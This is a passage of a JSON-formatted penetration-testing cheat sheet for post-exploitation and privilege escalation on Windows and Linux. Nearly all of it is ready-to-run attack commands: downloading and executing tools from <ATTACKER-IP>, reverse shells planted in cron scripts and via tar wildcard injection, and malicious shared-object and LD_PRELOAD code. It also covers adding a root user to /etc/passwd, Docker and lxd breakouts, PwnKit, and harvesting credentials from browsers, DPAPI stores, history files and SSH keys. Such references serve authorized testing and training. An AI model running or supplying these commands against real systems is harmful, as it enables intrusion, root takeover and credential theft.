                    "net group \"Enterprise Admins\" /domain"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-22",
          "name": "Windows: Antivirus & Security Tools",
          "description": "Antivirus & Security Tools",
          "commands": [
            {
              "desc": "Antivirus & Security Tools",
              "entries": [
                {
                  "cmd": [
                    ":: Check for Windows Defender",
                    "sc query WinDefend",
                    "Get-MpComputerStatus   (PowerShell)",
                    "",
                    ":: Check for other AV",
                    "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,pathToSignedProductExe",
                    "",
                    ":: AppLocker policy",
                    "Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections   (PowerShell)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-23",
          "name": "Windows: Discovering KDBX files",
          "description": "<empty-block/>",
          "commands": [
            {
              "desc": "Discovering KDBX files",
              "entries": [
                {
                  "cmd": [
                    "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
                    "Get-ChildItem -Path C:\\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue # flag, are you in powershell",
                    "powershell -c \"Get-ChildItem -Path C:\\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue\" # if you are in cmd"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-24",
          "name": "Windows: Automated Enumeration Tools",
          "description": "Automated Enumeration Tools",
          "commands": [
            {
              "desc": "WinPEAS",
              "entries": [
                {
                  "cmd": [
                    ":: Download and run WinPEAS",
                    "certutil -urlcache -split -f http://<ATTACKER-IP>/winPEASx64.exe C:\\Temp\\winpeas.exe",
                    "C:\\Temp\\winpeas.exe",
                    "",
                    ":: Run with specific checks",
                    "winPEASx64.exe servicesinfo",
                    "winPEASx64.exe userinfo"
                  ]
                }
              ]
            },
            {
              "desc": "PowerUp (PowerSploit)",
              "entries": [
                {
                  "cmd": [
                    "# Download and run all checks",
                    "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER-IP>/PowerUp.ps1')",
                    "Invoke-AllChecks"
                  ]
                }
              ]
            },
            {
              "desc": "Seatbelt",
              "entries": [
                {
                  "cmd": [
                    "Seatbelt.exe -group=all",
                    "Seatbelt.exe -group=user",
                    "Seatbelt.exe -group=system"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-25",
          "name": "Windows: Batch Enumeration Script",
          "description": "Batch Enumeration Script",
          "commands": [
            {
              "desc": "Batch Enumeration Script",
              "entries": [
                {
                  "cmd": [
                    "@echo off",
                    "echo ====== SYSTEM INFO ======",
                    "systeminfo",
                    "echo.",
                    "echo ====== CURRENT USER ======",
                    "whoami /all",
                    "echo.",
                    "echo ====== LOCAL USERS ======",
                    "net user",
                    "echo.",
                    "echo ====== ADMINISTRATORS ======",
                    "net localgroup Administrators",
                    "echo.",
                    "echo ====== NETWORK CONFIG ======",
                    "ipconfig /all",
                    "echo.",
                    "echo ====== LISTENING PORTS ======",
                    "netstat -ano | findstr LISTENING",
                    "echo.",
                    "echo ====== RUNNING SERVICES ======",
                    "sc query state=all | findstr SERVICE_NAME",
                    "echo.",
                    "echo ====== SCHEDULED TASKS ======",
                    "schtasks /query /fo LIST",
                    "echo.",
                    "echo ====== SAVED CREDENTIALS ======",
                    "cmdkey /list",
                    "echo.",
                    "echo ====== AUTOLOGON ======",
                    "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-26",
          "name": "Windows: PowerShell History",
          "description": "When to check: ALWAYS. PowerShell history often contains plaintext passwords from previous admin sessions. One of the highest-value post-exploitation checks.",
          "commands": [
            {
              "desc": "PowerShell History",
              "entries": [
                {
                  "subdesc": "When to check: ALWAYS. PowerShell history often contains plaintext passwords from previous admin sessions. One of the highest-value post-exploitation checks.",
                  "cmd": [
                    "# Current user's PowerShell history",
                    "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                    "",
                    "# PowerShell native path",
                    "Get-Content (Get-PSReadLineOption).HistorySavePath",
                    "",
                    "# Check ALL users' history files",
                    "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object {",
                    "    Write-Host \"`n===$($_.FullName) ===\" -ForegroundColor Yellow",
                    "    Get-Content $_",
                    "}"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-27",
          "name": "Windows: Windows Credential Manager",
          "description": "Purpose: Windows stores credentials for scheduled tasks, mapped drives, and web logins in Credential Manager. Extractable with the right tools.",
          "commands": [
            {
              "desc": "Windows Credential Manager",
              "entries": [
                {
                  "subdesc": "Purpose: Windows stores credentials for scheduled tasks, mapped drives, and web logins in Credential Manager. Extractable with the right tools.",
                  "cmd": [
                    "# List stored credentials (GUI)",
                    "rundll32.exe keymgr.dll,KRShowKeyMgr",
                    "",
                    "# Command-line enumeration",
                    "cmdkey /list",
                    "",
                    "# VaultCmd — list all vaults and credentials",
                    "vaultcmd /listcreds:\"Windows Credentials\" /all",
                    "vaultcmd /listcreds:\"Web Credentials\" /all",
                    "",
                    "# If you see stored credentials — use runas /savecred",
                    "runas /savecred /user:<DOMAIN>\\<USER> cmd.exe"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-28",
          "name": "Windows: Browser Credential Recovery",
          "description": "When to run: After gaining access to a user’s session. Browsers store saved passwords in encrypted databases that can be decrypted with the user’s context.",
          "commands": [
            {
              "desc": "Browser Credential Recovery",
              "entries": [
                {
                  "subdesc": "When to run: After gaining access to a user’s session. Browsers store saved passwords in encrypted databases that can be decrypted with the user’s context.",
                  "cmd": [
                    "# SharpChrome — extract Chrome saved passwords and cookies",
                    ".\\SharpChrome.exe logins",
                    ".\\SharpChrome.exe cookies",
                    "",
                    "# LaZagne — comprehensive credential recovery (ALL applications)",
                    ".\\LaZagne.exe all",
                    ".\\LaZagne.exe browsers",
                    "",
                    "# Manual — Chrome Login Data location (SQLite database)",
                    "# Copy this file to attacker machine for offline extraction:",
                    "# C:\\Users\\<USER>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
                    "",
                    "# Firefox profiles (passwords stored in logins.json + key4.db)",
                    "Get-ChildItem \"C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\logins.json\" -ErrorAction SilentlyContinue"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-29",
          "name": "Windows: DPAPI Credential Extraction",
          "description": "When to run: When you need to decrypt Windows-protected secrets (Credential Manager, browser passwords, WiFi keys). DPAPI uses the user’s password or domain backup key for encryption.",
          "commands": [
            {
              "desc": "DPAPI Credential Extraction",
              "entries": [
                {
                  "subdesc": "When to run: When you need to decrypt Windows-protected secrets (Credential Manager, browser passwords, WiFi keys). DPAPI uses the user’s password or domain backup key for encryption.",
                  "cmd": [
                    "# List DPAPI master keys",
                    "Get-ChildItem C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Protect\\ -Recurse",
                    "",
                    "# List DPAPI credential blobs",
                    "Get-ChildItem C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Credentials\\ -Recurse",
                    "Get-ChildItem C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Credentials\\ -Recurse"
                  ]
                },
                {
                  "cmd": [
                    ":: With Mimikatz — decrypt DPAPI secrets",
                    "mimikatz# dpapi::cred /in:C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Credentials\\<BLOB>",
                    "mimikatz# dpapi::masterkey /in:C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\<MASTERKEY> /rpc",
                    "",
                    ":: SharpDPAPI — automated DPAPI extraction",
                    ".\\SharpDPAPI.exe triage",
                    ".\\SharpDPAPI.exe credentials"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-30",
          "name": "Windows: Mapped Drives & Network Shares",
          "description": "Mapped Drives & Network Shares",
          "commands": [
            {
              "desc": "Mapped Drives & Network Shares",
              "entries": [
                {
                  "cmd": [
                    "# Currently mapped drives",
                    "net use",
                    "Get-PSDrive -PSProvider FileSystem",
                    "",
                    "# Recently connected shares (may reveal other hosts/credentials)",
                    "Get-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\*\" -ErrorAction SilentlyContinue",
                    "",
                    "# Search for UNC paths in registry",
                    "reg query HKCU\\Network /s 2>nul"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-31",
          "name": "Windows: Recently Accessed Files & Recycle Bin",
          "description": "Recently Accessed Files & Recycle Bin",
          "commands": [
            {
              "desc": "Recently Accessed Files & Recycle Bin",
              "entries": [
                {
                  "cmd": [
                    "# Recent files (may reveal interesting document names and paths)",
                    "Get-ChildItem \"C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.lnk\" -ErrorAction SilentlyContinue",
                    "",
                    "# Recycle Bin contents (deleted files may contain credentials)",
                    "Get-ChildItem 'C:\\$Recycle.Bin' -Recurse -Force -ErrorAction SilentlyContinue",
                    "",
                    "# Desktop, Downloads, Documents — quick triage",
                    "Get-ChildItem C:\\Users\\*\\Desktop\\*, C:\\Users\\*\\Downloads\\*, C:\\Users\\*\\Documents\\* -Include *.txt,*.doc*,*.xls*,*.pdf,*.kdbx,*.config,*.ini,*.bak -ErrorAction SilentlyContinue"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-32",
          "name": "Windows: Installed Software Enumeration",
          "description": "Purpose: Identify software that may have known exploits, default credentials, or privilege escalation vectors.",
          "commands": [
            {
              "desc": "Installed Software Enumeration",
              "entries": [
                {
                  "subdesc": "Purpose: Identify software that may have known exploits, default credentials, or privilege escalation vectors.",
                  "cmd": [
                    "# List installed software (32-bit and 64-bit)",
                    "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | Select DisplayName, DisplayVersion, Publisher",
                    "Get-ItemProperty \"HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | Select DisplayName, DisplayVersion, Publisher",
                    "",
                    "# Alternative (quick view)",
                    "wmic product get name,version 2>nul"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-33",
          "name": "Linux PrivEsc: Automated Enumeration",
          "description": "Run first! Always start with automated enumeration to quickly identify PrivEsc vectors before manual checks.",
          "commands": [
            {
              "desc": "Automated Enumeration",
              "entries": [
                {
                  "subdesc": "Run first! Always start with automated enumeration to quickly identify PrivEsc vectors before manual checks.",
                  "cmd": [
                    "# linPEAS — comprehensive automated Linux privilege escalation scanner",
                    "# Download: https://github.com/carlospolop/PEASS-ng/releases",
                    "curl http://<ATTACKER-IP>/linpeas.sh | bash",
                    "# Or download then run:",
                    "wget http://<ATTACKER-IP>/linpeas.sh -O /tmp/linpeas.sh",
                    "chmod +x /tmp/linpeas.sh",
                    "/tmp/linpeas.sh",
                    "",
                    "# linEnum — alternative enumeration",
                    "wget http://<ATTACKER-IP>/LinEnum.sh -O /tmp/linenum.sh",
                    "chmod +x /tmp/linenum.sh",
                    "/tmp/linenum.sh"
                  ]
                }
              ]
            },
            {
              "desc": "Manual Quick Wins Checklist",
              "entries": [
                {
                  "subdesc": "Run these immediately on every new shell to understand your context and spot easy wins.",
                  "cmd": [
                    "# Who am I and what can I do?",
                    "id",
                    "whoami",
                    "sudo -l",
                    "cat /etc/passwd | grep -v nologin | grep -v false",
                    "cat /etc/shadow  # If readable — crack the hashes!",
                    "",
                    "# System info (for kernel exploits)",
                    "uname -a",
                    "cat /etc/os-release",
                    "",
                    "# Network info (identify other targets for pivoting)",
                    "ip a",
                    "ss -tlnp",
                    "cat /etc/hosts",
                    "",
                    "# Find interesting files",
                    "find / -writable -type f 2>/dev/null | grep -v proc",
                    "find / -name \"*.bak\" -o -name \"*.old\" -o -name \"*.conf\" 2>/dev/null"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-34",
          "name": "Linux PrivEsc: Sudo Misconfigurations",
          "description": "When to check: Always. sudo -l is the single most important PrivEsc command on Linux. If it shows any entries, check GTFOBins immediately.",
          "commands": [
            {
              "desc": "Sudo Misconfigurations",
              "entries": [
                {
                  "subdesc": "When to check: Always. sudo -l is the single most important PrivEsc command on Linux. If it shows any entries, check GTFOBins immediately.",
                  "cmd": [
                    "# Check your sudo privileges",
                    "sudo -l"
                  ]
                },
                {
                  "cmd": [
                    "# Common GTFOBins exploits",
                    "sudo vim -c ':!/bin/bash'",
                    "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
                    "sudo find / -exec /bin/bash \\; -quit",
                    "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
                    "sudo env /bin/bash",
                    "sudo less /etc/shadow  # then type !bash"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-35",
          "name": "Linux PrivEsc: SUID Binary Exploitation",
          "description": "When to check: Always. SUID binaries execute with the file owner’s permissions (usually root). Find unusual ones and check GTFOBins.",
          "commands": [
            {
              "desc": "SUID Binary Exploitation",
              "entries": [
                {
                  "subdesc": "When to check: Always. SUID binaries execute with the file owner’s permissions (usually root). Find unusual ones and check GTFOBins.",
                  "cmd": [
                    "# Find all SUID binaries on the system",
                    "find / -perm -4000 -type f 2>/dev/null",
                    "find / -perm -u=s -type f 2>/dev/null",
                    "",
                    "# Compare against standard binaries — unusual ones are targets",
                    "# Check each non-standard binary at https://gtfobins.github.io/"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-36",
          "name": "Linux PrivEsc: Cron Job Exploitation",
          "description": "When to check: Always look for cron jobs running as root that reference writable scripts or use wildcards.",
          "commands": [
            {
              "desc": "Writable Cron Scripts",
              "entries": [
                {
                  "cmd": [
                    "# Inspect all cron jobs",
                    "cat /etc/crontab",
                    "ls -la /etc/cron.d/",
                    "ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/",
                    "crontab -l",
                    "",
                    "# Check permissions on scripts referenced by cron",
                    "ls -la /path/to/cron_script.sh",
                    "",
                    "# If writable, append a reverse shell",
                    "echo 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1' >> /path/to/cron_script.sh"
                  ]
                }
              ]
            },
            {
              "desc": "Wildcard Injection (TAR Cron Jobs)",
              "entries": [
                {
                  "subdesc": "When to exploit: A cron job runs tar with a wildcard * in a directory you can write to. Create filenames that tar interprets as command-line flags.",
                  "cmd": [
                    "# Example cron: tar czf /tmp/backup.tar.gz *",
                    "# In the writable directory where the wildcard expands:",
                    "echo 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1' > shell.sh",
                    "chmod +x shell.sh",
                    "",
                    "# Create filenames that become tar flags",
                    "touch -- '--checkpoint=1'",
                    "touch -- '--checkpoint-action=exec=bash shell.sh'"
                  ]
                }
              ]
            },
            {
              "desc": "PATH Hijacking",
              "entries": [
                {
                  "subdesc": "When to exploit: A cron job calls a command without a full path and a writable directory appears earlier in PATH.",
                  "cmd": [
                    "# If /usr/local/bin is writable and in PATH before the real script:",
                    "echo '#!/bin/bash' > /usr/local/bin/backup.sh",
                    "echo 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1' >> /usr/local/bin/backup.sh",
                    "chmod +x /usr/local/bin/backup.sh"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-37",
          "name": "Linux PrivEsc: Linux Capabilities",
          "description": "When to check: After SUID checks. Capabilities provide granular root-like powers to specific binaries without full SUID.",
          "commands": [
            {
              "desc": "Linux Capabilities",
              "entries": [
                {
                  "subdesc": "When to check: After SUID checks. Capabilities provide granular root-like powers to specific binaries without full SUID.",
                  "cmd": [
                    "# Find binaries with capabilities",
                    "getcap -r / 2>/dev/null"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-38",
          "name": "Linux PrivEsc: NFS Root Squashing",
          "description": "When to exploit: /etc/exports shows no_root_squash on a share. Files created as root on the client retain root ownership on the server — create a SUID binary.",
          "commands": [
            {
              "desc": "NFS Root Squashing",
              "entries": [
                {
                  "subdesc": "When to exploit: /etc/exports shows no_root_squash on a share. Files created as root on the client retain root ownership on the server — create a SUID binary.",
                  "cmd": [
                    "# Check NFS exports on target",
                    "cat /etc/exports",
                    "# Look for: /shared *(rw,no_root_squash)",
                    "",
                    "# On attacker: Mount the NFS share",
                    "sudo mount -t nfs <TARGET-IP>:/shared /mnt/nfs",
                    "",
                    "# Create a SUID bash binary",
                    "sudo cp /bin/bash /mnt/nfs/rootbash",
                    "sudo chmod +s /mnt/nfs/rootbash",
                    "",
                    "# On target: Execute the SUID binary",
                    "/shared/rootbash -p"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-39",
          "name": "Linux PrivEsc: Shared Object Injection",
          "description": "When to exploit: A SUID binary loads a shared object (.so) from a writable location. Use strace to identify missing shared objects.",
          "commands": [
            {
              "desc": "Shared Object Injection",
              "entries": [
                {
                  "subdesc": "When to exploit: A SUID binary loads a shared object (.so) from a writable location. Use strace to identify missing shared objects.",
                  "cmd": [
                    "# Find missing shared objects loaded by a SUID binary",
                    "strace <SUID-BINARY> 2>&1 | grep -i 'open\\|access\\|no such file'",
                    "",
                    "# Create a malicious shared object",
                    "cat > /tmp/exploit.c << 'EOF'",
                    "#include <stdio.h>",
                    "#include <stdlib.h>",
                    "",
                    "static void inject() __attribute__((constructor));",
                    "",
                    "void inject() {",
                    "    setuid(0);",
                    "    setgid(0);",
                    "    system(\"/bin/bash -p\");",
                    "}",
                    "EOF",
                    "",
                    "gcc -shared -fPIC -o /path/to/expected/library.so /tmp/exploit.c",
                    "",
                    "# Run the SUID binary — it loads your malicious .so and spawns a root shell"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-40",
          "name": "Linux PrivEsc: Docker Breakout",
          "description": "When to exploit: The current user is in the docker group. Docker group membership is effectively root access.",
          "commands": [
            {
              "desc": "Docker Breakout",
              "entries": [
                {
                  "subdesc": "When to exploit: The current user is in the docker group. Docker group membership is effectively root access.",
                  "cmd": [
                    "# Check if in docker group",
                    "id | grep docker",
                    "",
                    "# Mount host filesystem and chroot — instant root",
                    "docker run -v /:/hostfs -it alpine /bin/sh",
                    "chroot /hostfs /bin/bash",
                    "",
                    "# Alternative with --privileged flag",
                    "docker run --rm -v /:/mnt --privileged alpine chroot /mnt sh"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-41",
          "name": "Linux PrivEsc: Kernel Exploits",
          "description": "When to use: Last resort after checking all misconfigurations. Kernel exploits can crash the system. Always check uname -r first.",
          "commands": [
            {
              "desc": "Kernel Exploits",
              "entries": [
                {
                  "subdesc": "When to use: Last resort after checking all misconfigurations. Kernel exploits can crash the system. Always check uname -r first.",
                  "cmd": [
                    "# Check kernel version",
                    "uname -r",
                    "cat /etc/os-release",
                    "",
                    "# Search for known exploits",
                    "searchsploit linux kernel <VERSION> privilege escalation"
                  ]
                }
              ]
            },
            {
              "desc": "PwnKit (CVE-2021-4034)",
              "entries": [
                {
                  "subdesc": "Impact: Affects almost all Linux distros with polkit installed. Near-universal privesc.",
                  "cmd": [
                    "curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit",
                    "chmod +x PwnKit",
                    "./PwnKit"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-42",
          "name": "Linux PrivEsc: LD_PRELOAD / LD_LIBRARY_PATH",
          "description": "When to exploit: sudo -l shows env_keep += LD_PRELOAD. Preload a malicious library that runs code as root before the allowed command.",
          "commands": [
            {
              "desc": "LD_PRELOAD / LD_LIBRARY_PATH",
              "entries": [
                {
                  "subdesc": "When to exploit: sudo -l shows env_keep += LD_PRELOAD. Preload a malicious library that runs code as root before the allowed command.",
                  "cmd": [
                    "// preload.c",
                    "#include<stdio.h>",
                    "#include<stdlib.h>",
                    "#include<sys/types.h>",
                    "",
                    "void _init() {",
                    "    unsetenv(\"LD_PRELOAD\");",
                    "    setresuid(0, 0, 0);",
                    "    system(\"/bin/bash -p\");",
                    "}"
                  ]
                },
                {
                  "cmd": [
                    "gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c",
                    "sudo LD_PRELOAD=/tmp/preload.so <ALLOWED-COMMAND>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-43",
          "name": "Linux PrivEsc: Writable /etc/passwd",
          "description": "When to check: Always. If /etc/passwd is world-writable, you can add a root-level user directly.",
          "commands": [
            {
              "desc": "Writable /etc/passwd",
              "entries": [
                {
                  "subdesc": "When to check: Always. If /etc/passwd is world-writable, you can add a root-level user directly.",
                  "cmd": [
                    "# Check permissions",
                    "ls -la /etc/passwd",
                    "",
                    "# If writable — generate a password hash",
                    "openssl passwd -1 -salt hacker Password123",
                    "# Output: $1$hacker$6luIRwdGpBvXdP.GMwcZp/",
                    "",
                    "# Add a root user (UID 0, GID 0)",
                    "echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash' >> /etc/passwd",
                    "",
                    "# Switch to the new root user",
                    "su hacker",
                    "# Password: Password123"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-44",
          "name": "Linux PrivEsc: lxd/lxc Group Privilege Escalation",
          "description": "When to check: Run id — if the current user is in the lxd or lxc group, you can mount the host filesystem inside a privileged container and access everything as root.",
          "commands": [
            {
              "desc": "lxd/lxc Group Privilege Escalation",
              "entries": [
                {
                  "subdesc": "When to check: Run id — if the current user is in the lxd or lxc group, you can mount the host filesystem inside a privileged container and access everything as root.",
                  "cmd": [
                    "# Check group membership",
                    "id",
                    "# Look for: lxd or lxc in the groups list",
                    "",
                    "# On attacker machine: build an Alpine image",
                    "git clone https://github.com/saghul/lxd-alpine-builder.git",
                    "cd lxd-alpine-builder",
                    "sudo bash build-alpine",
                    "# Transfer the .tar.gz file to the target",
                    "",
                    "# On target: import and launch the container",
                    "lxc image import ./alpine-v*.tar.gz --alias myimage",
                    "lxc init myimage mycontainer -c security.privileged=true",
                    "lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true",
                    "lxc start mycontainer",
                    "lxc exec mycontainer /bin/sh",
                    "",
                    "# Now access the host filesystem",
                    "cat /mnt/root/root/proof.txt",
                    "cat /mnt/root/etc/shadow"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-45",
          "name": "Linux PrivEsc: Credential Harvesting (Post-Foothold)",
          "description": "When to run: After landing on any Linux system. Check ALL of these before running automated tools. Many contain plaintext credentials.",
          "commands": [
            {
              "desc": "History Files",
              "entries": [
                {
                  "cmd": [
                    "# Bash history — may contain passwords passed as arguments",
                    "cat ~/.bash_history",
                    "cat /home/*/.bash_history",
                    "cat /root/.bash_history 2>/dev/null",
                    "",
                    "# Other history files",
                    "cat ~/.zsh_history",
                    "cat ~/.mysql_history",
                    "cat ~/.psql_history"
                  ]
                }
              ]
            },
            {
              "desc": "SSH Keys & Configs",
              "entries": [
                {
                  "cmd": [
                    "# SSH private keys (try all users)",
                    "find / -name \"id_rsa\" -o -name \"id_ecdsa\" -o -name \"id_ed25519\" 2>/dev/null",
                    "cat ~/.ssh/id_rsa",
                    "cat ~/.ssh/authorized_keys",
                    "cat ~/.ssh/known_hosts",
                    "cat ~/.ssh/config",
                    "",
                    "# Check for SSH agent forwarding",
                    "ls -la /tmp/ssh-*"
                  ]
                }
              ]
            },
            {
              "desc": "Config Files with Embedded Credentials",
              "entries": [
                {
                  "cmd": [
                    "# Web application configs",
                    "cat /var/www/html/wp-config.php 2>/dev/null",
                    "cat /var/www/html/configuration.php 2>/dev/null",
                    "cat /var/www/html/.env 2>/dev/null",
                    "find /var/www/ -name \"*.config\" -o -name \"*.conf\" -o -name \"*.ini\" -o -name \".env\" 2>/dev/null",
                    "",
                    "# Database configs",
                    "cat /etc/mysql/debian.cnf 2>/dev/null",
                    "cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null",
                    "",
                    "# Other common locations",
                    "cat /opt/*/.env 2>/dev/null",
                    "find / -name \"*.bak\" -o -name \"*.old\" -o -name \"*.conf\" 2>/dev/null | head -30"
                  ]
                }
              ]
            },
            {
              "desc": "Environment Variables",
              "entries": [
                {
                  "cmd": [
                    "# Check for credentials in environment",
                    "env",
                    "printenv",
                    "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i pass"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-46",
          "name": "Linux PrivEsc: PATH Hijacking",
          "description": "When to check: When a SUID binary, cron job, or script calls a command WITHOUT its full path (e.g., service instead of /usr/sbin/service).",
          "commands": [
            {
              "desc": "PATH Hijacking",
              "entries": [
                {
                  "subdesc": "When to check: When a SUID binary, cron job, or script calls a command WITHOUT its full path (e.g., service instead of /usr/sbin/service).",
                  "cmd": [
                    "# Check for writable directories in PATH",
                    "echo $PATH | tr ':' '\\n'",
                    "# Look for directories you can write to: /tmp, /home/user/bin, etc.",
                    "",
                    "# Check if a SUID binary uses relative paths",
                    "strings /usr/local/bin/suid-binary | grep -v '/'",
                    "# If it calls \"service\" instead of \"/usr/sbin/service\":",
                    "",
                    "# Create a malicious binary with the same name",
                    "echo '#!/bin/bash' > /tmp/service",
                    "echo 'bash -p' >> /tmp/service",
                    "chmod +x /tmp/service",
                    "",
                    "# Prepend /tmp to PATH and run the SUID binary",
                    "export PATH=/tmp:$PATH",
                    "/usr/local/bin/suid-binary"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-47",
          "name": "Linux PrivEsc: Python Library Hijacking",
          "description": "When to check: When a Python script runs as root (via cron, SUID wrapper, or sudo) and imports a module you can overwrite, or when a writable directory appears in sys.path before the real module.",
          "commands": [
            {
              "desc": "Python Library Hijacking",
              "entries": [
                {
                  "subdesc": "When to check: When a Python script runs as root (via cron, SUID wrapper, or sudo) and imports a module you can overwrite, or when a writable directory appears in sys.path before the real module.",
                  "cmd": [
                    "# Check Python module search path",
                    "python3 -c \"import sys; print('\\n'.join(sys.path))\"",
                    "",
                    "# If a root-owned script imports a module, check if you can write to any path in sys.path",
                    "# Example: script imports \"backup\" module",
                    "find / -name \"backup.py\" -writable 2>/dev/null",
                    "",
                    "# Or create a malicious module in a writable path that comes first",
                    "cat > /tmp/backup.py << 'EOF'",
                    "import os",
                    "os.system(\"bash -p\")",
                    "EOF"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-48",
          "name": "Linux PrivEsc: Systemd Timers",
          "description": "When to check: Systemd timers are the modern replacement for cron. Check for writable service unit files or scripts they execute. <empty-block/>",
          "commands": [
            {
              "desc": "Systemd Timers",
              "entries": [
                {
                  "subdesc": "When to check: Systemd timers are the modern replacement for cron. Check for writable service unit files or scripts they execute.",
                  "cmd": [
                    "# List active timers",
                    "systemctl list-timers --all",
                    "",
                    "# Check timer and service file details",
                    "systemctl cat <TIMER-NAME>.timer",
                    "systemctl cat <SERVICE-NAME>.service",
                    "",
                    "# Look for writable ExecStart scripts",
                    "find /etc/systemd/ /usr/lib/systemd/ -writable 2>/dev/null",
                    "",
                    "# If ExecStart points to a writable script, replace it with a reverse shell"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-49",
          "name": "Windows PrivEsc: Automated Enumeration",
          "description": "Run first! Always start with automated enumeration tools to quickly identify potential vectors before manual checks.",
          "commands": [
            {
              "desc": "Automated Enumeration",
              "entries": [
                {
                  "subdesc": "Run first! Always start with automated enumeration tools to quickly identify potential vectors before manual checks.",
                  "cmd": [
                    ":: winPEAS — comprehensive automated privilege escalation scanner",
                    ":: Download: https://github.com/carlospolop/PEASS-ng/releases",
                    ".\\winPEASx64.exe",
                    "",
                    ":: If antivirus blocks the exe, try the .bat or .ps1 versions",
                    ".\\winPEAS.bat",
                    "",
                    ":: PowerUp — checks common PrivEsc misconfigurations",
                    "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER-IP>/PowerUp.ps1'); Invoke-AllChecks\""
                  ]
                }
              ]
            },
            {
              "desc": "PowerUp Specific Checks",
              "entries": [
                {
                  "cmd": [
                    "# Load PowerUp in memory",
                    "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER-IP>/PowerUp.ps1')",
                    "",
                    "# Run all checks at once (recommended)",
                    "Invoke-AllChecks",
                    "",
                    "# Or run targeted checks",
                    "Get-UnquotedService",
                    "Get-ModifiableServiceFile",
                    "Get-ModifiableService"
                  ]
                }
              ]
            },
            {
              "desc": "Manual Quick Wins Checklist",
              "entries": [
                {
                  "cmd": [
                    ":: Always run these first to understand your context",
                    "whoami",
                    "whoami /priv",
                    "whoami /groups",
                    "systeminfo",
                    "net user",
                    "net localgroup Administrators"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-50",
          "name": "Windows PrivEsc: Service Binary Hijacking",
          "description": "When to exploit: A service runs as SYSTEM and you have write access to its executable path. Replace the binary with a malicious one, then restart the service.",
          "commands": [
            {
              "desc": "Service Binary Hijacking",
              "entries": [
                {
                  "subdesc": "When to exploit: A service runs as SYSTEM and you have write access to its executable path. Replace the binary with a malicious one, then restart the service.",
                  "cmd": [
                    ":: Find services and check binary paths",
                    "sc qc <SERVICE-NAME>",
                    "",
                    ":: Check if you can write to the binary location",
                    "icacls \"C:\\Program Files\\<SERVICE>\\service.exe\"",
                    "accesschk.exe /accepteula -wvu \"C:\\path\\to\\service.exe\""
                  ]
                },
                {
                  "cmd": [
                    "# Generate a malicious service binary (must be service format for sc start to work)",
